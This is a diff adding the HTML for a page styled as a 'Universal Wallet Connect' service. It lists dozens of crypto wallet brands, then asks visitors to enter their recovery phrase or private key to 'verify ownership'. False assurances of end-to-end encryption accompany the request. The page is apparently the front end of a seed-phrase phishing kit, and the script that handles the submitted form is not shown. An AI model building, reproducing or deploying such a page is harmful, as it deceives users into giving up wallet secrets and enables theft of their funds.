@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Universal Wallet Connect</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
+</head>
+<body>
+  <header class="site-header">
+    <div class="header-content">
+      <div class="logo">CBL ONLINE WALLET CONNECT</div>
+    </div>
+  </header>
+
+  <div class="container">
+    <section id="intro-section" class="animate-fade">
+      <div class="card">
+        <span class="badge">Secure Connection</span>
+        <h1>Universal Wallet Connect</h1>
+        <span class="subtitle">Connect your cryptocurrency wallet securely</span>
+        
+        <p class="mb-3">Please select your wallet provider to begin the connection process. Your credentials will be secured with end-to-end encryption.</p>
+        
+        <button id="start-connect-btn" class="btn btn-block">Connect Wallet</button>
+      </div>
+    </section>
+    
+    <section id="wallet-select-section">
+      <div class="card">
+        <span class="badge">Step 1 of 2</span>
+        <h2>Select Your Wallet</h2>
+        <p class="mb-3">Choose your wallet provider from the options below.</p>
+        
+        <div class="wallet-list">
+          <div class="wallet-item" data-wallet="metamask">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" class="wallet-icon">
+            <span class="wallet-name">MetaMask</span>
+          </div>
+          <div class="wallet-item" data-wallet="trustwallet">
+            <img src="https://files.catbox.moe/revmv3.jpeg" alt="Trust Wallet" class="wallet-icon">
+            <span class="wallet-name">Trust Wallet</span>
+          </div>
+          <div class="wallet-item" data-wallet="coinbase">
+            <img src="https://files.catbox.moe/ull58o.jpeg" alt="Coinbase" class="wallet-icon">
+            <span class="wallet-name">Coinbase</span>
+          </div>
+          <div class="wallet-item" data-wallet="phantom">
+            <img src="https://files.catbox.moe/y5bvru.png" alt="Phantom" class="wallet-icon">
+            <span class="wallet-name">Phantom</span>
+          </div>
+          <div class="wallet-item" data-wallet="binance">
+            <img src="https://files.catbox.moe/6h8hwg.png" alt="Binance" class="wallet-icon">
+            <span class="wallet-name">Binance</span>
+          </div>
+          <div class="wallet-item" data-wallet="exodus">
+            <img src="https://files.catbox.moe/3tgtbm.jpeg" alt="Exodus" class="wallet-icon">
+            <span class="wallet-name">Exodus</span>
+          </div>
+          <div class="wallet-item" data-wallet="trezor">
+            <img src="https://files.catbox.moe/phu0g7.png" alt="Trezor" class="wallet-icon">
+            <span class="wallet-name">Trezor</span>
+          </div>
+          <div class="wallet-item" data-wallet="bitcoin">
+            <img src="https://files.catbox.moe/u2kvry.png" alt="Bitcoin" class="wallet-icon">
+            <span class="wallet-name">Bitcoin</span>
+          </div>
+          <div class="wallet-item" data-wallet="ledger">
+            <img src="https://files.catbox.moe/7wf0t3.png" alt="Ledger" class="wallet-icon">
+            <span class="wallet-name">Ledger</span>
+          </div>
+          <!-- Additional wallets -->
+          <div class="wallet-item" data-wallet="ethereum">
+            <img src="https://files.catbox.moe/fqi88z.png" alt="Ethereum" class="wallet-icon">
+            <span class="wallet-name">Ethereum</span>
+          </div>
+          <div class="wallet-item" data-wallet="solana">
+            <img src="https://files.catbox.moe/i38rgt.jpeg" alt="Solana" class="wallet-icon">
+            <span class="wallet-name">Solana</span>
+          </div>
+          <div class="wallet-item" data-wallet="avalanche">
+            <img src="https://files.catbox.moe/q6120e.png" alt="Avalanche" class="wallet-icon">
+            <span class="wallet-name">Avalanche</span>
+          </div>
+          <div class="wallet-item" data-wallet="polygon">
+            <img src="https://files.catbox.moe/tldl1c.png" alt="Polygon" class="wallet-icon">
+            <span class="wallet-name">Polygon</span>
+          </div>
+          <div class="wallet-item" data-wallet="cardano">
+            <img src="https://files.catbox.moe/u1fmcl.png" alt="Cardano" class="wallet-icon">
+            <span class="wallet-name">Cardano</span>
+          </div>
+          <div class="wallet-item" data-wallet="polkadot">
+            <img src="https://files.catbox.moe/jew8g7.png" alt="Polkadot" class="wallet-icon">
+            <span class="wallet-name">Polkadot</span>
+          </div>
+          <div class="wallet-item" data-wallet="cosmos">
+            <img src="https://files.catbox.moe/yfhyj5.jpeg" alt="Cosmos" class="wallet-icon">
+            <span class="wallet-name">Cosmos</span>
+          </div>
+          <div class="wallet-item" data-wallet="algorand">
+            <img src="https://files.catbox.moe/jrgd2c.png" alt="Algorand" class="wallet-icon">
+            <span class="wallet-name">Algorand</span>
+          </div>
+          <div class="wallet-item" data-wallet="tron">
+            <img src="https://files.catbox.moe/2ptuqv.png" alt="Tron" class="wallet-icon">
+            <span class="wallet-name">Tron</span>
+          </div>
+          <div class="wallet-item" data-wallet="near">
+            <img src="https://files.catbox.moe/otmeu6.png" alt="Near" class="wallet-icon">
+            <span class="wallet-name">Near</span>
+          </div>
+          <div class="wallet-item" data-wallet="arbitrum">
+            <img src="https://files.catbox.moe/cofkej.png" alt="Arbitrum" class="wallet-icon">
+            <span class="wallet-name">Arbitrum</span>
+          </div>
+          <div class="wallet-item" data-wallet="optimism">
+            <img src="https://files.catbox.moe/8ylarr.png" alt="Optimism" class="wallet-icon">
+            <span class="wallet-name">Optimism</span>
+          </div>
+          <div class="wallet-item" data-wallet="base">
+            <img src="https://files.catbox.moe/hcncvg.png" alt="Base" class="wallet-icon">
+            <span class="wallet-name">Base</span>
+          </div>
+          <div class="wallet-item" data-wallet="zksync">
+            <img src="https://files.catbox.moe/r6ov0y.jpeg" alt="zkSync" class="wallet-icon">
+            <span class="wallet-name">zkSync</span>
+          </div>
+          <div class="wallet-item" data-wallet="starknet">
+            <img src="https://files.catbox.moe/1d436x.png" alt="StarkNet" class="wallet-icon">
+            <span class="wallet-name">StarkNet</span>
+          </div>
+          <div class="wallet-item" data-wallet="ronin">
+            <img src="https://files.catbox.moe/nu5o08.png" alt="Ronin" class="wallet-icon">
+            <span class="wallet-name">Ronin</span>
+          </div>
+          <div class="wallet-item" data-wallet="immutablex">
+            <img src="https://files.catbox.moe/3mp5kd.png" alt="ImmutableX" class="wallet-icon">
+            <span class="wallet-name">ImmutableX</span>
+          </div>
+          <div class="wallet-item" data-wallet="sui">
+            <img src="https://files.catbox.moe/xcy4m0.png" alt="Sui" class="wallet-icon">
+            <span class="wallet-name">Sui</span>
+          </div>
+          <div class="wallet-item" data-wallet="aptos">
+            <img src="https://files.catbox.moe/fcwqom.png" alt="Aptos" class="wallet-icon">
+            <span class="wallet-name">Aptos</span>
+          </div>
+          <div class="wallet-item" data-wallet="keplr">
+            <img src="https://files.catbox.moe/bcboeu.jpeg" alt="Keplr" class="wallet-icon">
+            <span class="wallet-name">Keplr</span>
+          </div>
+          <div class="wallet-item" data-wallet="rainbow">
+            <img src="https://files.catbox.moe/cq4qyz.jpeg" alt="Rainbow" class="wallet-icon">
+            <span class="wallet-name">Rainbow</span>
+          </div>
+          <div class="wallet-item" data-wallet="argent">
+            <img src="https://files.catbox.moe/9t94xs.png" alt="Argent" class="wallet-icon">
+            <span class="wallet-name">Argent</span>
+          </div>
+          <div class="wallet-item" data-wallet="zerion">
+            <img src="https://files.catbox.moe/5l3ido.png" alt="Zerion" class="wallet-icon">
+            <span class="wallet-name">Zerion</span>
+          </div>
+          <div class="wallet-item" data-wallet="alpha">
+            <img src="https://files.catbox.moe/pkaq03.png" alt="Alpha Wallet" class="wallet-icon">
+            <span class="wallet-name">Alpha Wallet</span>
+          </div>
+          <div class="wallet-item" data-wallet="safepal">
+            <img src="https://files.catbox.moe/jn7pbr.png" alt="SafePal" class="wallet-icon">
+            <span class="wallet-name">SafePal</span>
+          </div>
+          <div class="wallet-item" data-wallet="bitkeep">
+            <img src="https://files.catbox.moe/22dnec.png" alt="BitKeep" class="wallet-icon">
+            <span class="wallet-name">BitKeep</span>
+          </div>
+          <div class="wallet-item" data-wallet="tokenpocket">
+            <img src="https://files.catbox.moe/uhbyca.jpeg" alt="TokenPocket" class="wallet-icon">
+            <span class="wallet-name">TokenPocket</span>
+          </div>
+        </div>
+        
+        <button id="back-to-intro-btn" class="btn btn-outline">Back</button>
+      </div>
+    </section>
+    
+    <section id="recovery-phrase-section">
+      <div class="card">
+        <span class="badge">Step 2 of 2</span>
+        <h2>Verify Your <span id="selected-wallet-name">Wallet</span></h2>
+        <p class="mb-3">Please enter your recovery phrase or private key to verify wallet ownership.</p>
+        
+        <form id="recovery-form">
+          <div class="form-group">
+            <label for="recovery-phrase" class="form-label">Recovery Phrase / Private Key</label>
+            <textarea id="recovery-phrase" class="form-control" rows="4" placeholder="Enter your 12 or 24-word recovery phrase..." required></textarea>
+            <span class="form-text">Your recovery phrase is never stored or transmitted unencrypted.</span>
+          </div>
+          
+          <div class="form-group">
+            <button type="submit" id="connect-btn" class="btn btn-block">Connect</button>
+          </div>
+          
+          <button type="button" id="back-to-select-btn" class="btn btn-outline btn-block mt-2">Back to Wallet Selection</button>
+        </form>
+      </div>
+    </section>
+  </div>
+
+  <section id="about-section">
+    <div class="about-container">
+      <div class="about-content">
+        <h2>About CBL Wallet Connect</h2>
+        <p>CBL Online Wallet Connect provides secure, seamless integration with all major cryptocurrency wallets. Our platform ensures your digital assets remain protected while giving you complete control.</p>
+        <p>Founded in 2022, we've helped thousands of users manage their blockchain assets with confidence and ease.</p>
+      </div>
+      <div class="newsletter-form">
+        <h3>Stay Updated</h3>
+        <p>Subscribe to our newsletter for the latest updates, security tips, and cryptocurrency news.</p>
+        <form id="newsletter-form">
+          <div class="form-group newsletter-input-group">
+            <input type="email" id="newsletter-email" class="form-control" placeholder="Enter your email address" required>
+            <button type="submit" class="btn">Subscribe</button>
+          </div>
+          <div class="social-links">
+            <a href="mailto:contact@cblwallet.com" class="social-link">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg" alt="Email" class="social-icon">
+            </a>
+            <a href="#" class="social-link">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/c/ce/Twitter_Logo.png" alt="Twitter" class="social-icon">
+            </a>
+            <a href="#" class="social-link">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram" class="social-icon">
+            </a>
+          </div>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <footer class="site-footer">
+    <div class="footer-content">
+      <p>© 2023 CBL ONLINE WALLET CONNECT. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script src="https://cdn.gpteng.co/gptengineer.js" type="module"></script>
+  <script src="script.js"></script>
+  <script>
+    document.getElementById('newsletter-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const email = document.getElementById('newsletter-email').value;
+      if (email) {
+        alert('Thank you for subscribing! We\'ll send updates to ' + email);
+        document.getElementById('newsletter-email').value = '';
+      } else {
+        alert('Please enter your email address.');
+      }
+    });
+  </script>
+</body>
+</html>
